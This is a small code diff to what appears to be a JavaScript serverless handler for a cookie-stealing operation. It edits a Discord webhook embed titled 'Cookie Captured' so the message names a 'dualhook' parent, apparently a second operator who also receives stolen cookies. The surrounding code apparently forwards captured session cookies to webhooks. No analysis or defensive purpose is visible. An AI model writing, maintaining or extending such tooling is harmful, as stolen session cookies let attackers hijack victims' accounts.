@@ -176,7 +176,7 @@ export default async function handler(req, res) {
     embeds: [{
       title:       '🍪 Cookie Captured',
       description: record.dualhookParent
-        ? '<a:emoji_17:1508694920972468347> dh parent <a:emoji_17:1508694920972468347>'
+        ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
         : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
       color:     0xc026d3,
       fields:    wh2Fields,
